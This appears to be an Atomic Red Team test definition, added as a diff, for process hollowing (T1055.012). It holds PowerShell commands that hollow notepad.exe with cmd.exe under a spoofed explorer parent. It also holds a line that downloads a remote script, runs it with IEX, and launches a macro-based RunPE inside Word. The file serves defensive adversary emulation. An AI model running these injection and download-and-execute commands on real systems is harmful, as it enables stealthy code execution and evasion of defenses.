@@ -1,0 +1,80 @@
+atomic_tests:
+- auto_generated_guid: 562427b4-39ef-4e8c-af88-463a78e70b9c
+  description: 'This test uses PowerShell to create a Hollow from a PE on disk with
+    explorer as the parent.
+
+    Credit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)
+
+    '
+  executor:
+    cleanup_command: 'Stop-Process -Name "#{spawnto_process_name}" -ErrorAction Ignore
+
+      '
+    command: '. #{start_hollow_script_path}
+
+      $ppid=Get-Process #{parent_process_name} | select -expand id
+
+      Start-Hollow -Sponsor "#{sponsor_binary_path}" -Hollow "#{hollow_binary_path}"
+      -ParentPID $ppid -Verbose
+
+      '
+    name: powershell
+  input_arguments:
+    hollow_binary_path:
+      default: C:\Windows\System32\cmd.exe
+      description: Path of the binary to hollow (executable that will run inside the
+        sponsor)
+      type: string
+    parent_process_name:
+      default: explorer
+      description: Name of the parent process
+      type: string
+    spawnto_process_name:
+      default: notepad
+      description: Name of the process to spawn
+      type: string
+    sponsor_binary_path:
+      default: C:\Windows\System32\notepad.exe
+      description: Path of the sponsor binary (executable that will host the binary)
+      type: string
+    start_hollow_script_path:
+      default: C:\Users\anis\Desktop\Start-Hollow.ps1
+      description: start_hollow path
+      type: path
+  name: Process Hollowing using PowerShell
+  supported_platforms:
+  - windows
+- auto_generated_guid: 3ad4a037-1598-4136-837c-4027e4fa319b
+  dependencies:
+  - description: 'Microsoft #{ms_product} must be installed
+
+      '
+    get_prereq_command: 'Write-Host "You will need to install Microsoft #{ms_product}
+      manually to meet this requirement"
+
+      '
+    prereq_command: "try {\n  New-Object -COMObject \"#{ms_product}.Application\"\
+      \ | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process\
+      \ = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1\
+      \ }\n"
+  dependency_executor_name: powershell
+  description: 'This module executes notepad.exe from within the WINWORD.EXE process
+
+    '
+  executor:
+    command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n\
+      IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"\
+      \ -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\\
+      src\\T1055.012-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Exploit\"\
+      \n"
+    name: powershell
+  input_arguments:
+    ms_product:
+      default: Word
+      description: Maldoc application Word
+      type: string
+  name: RunPE via VBA
+  supported_platforms:
+  - windows
+attack_technique: T1055.012
+display_name: 'Process Injection: Process Hollowing'
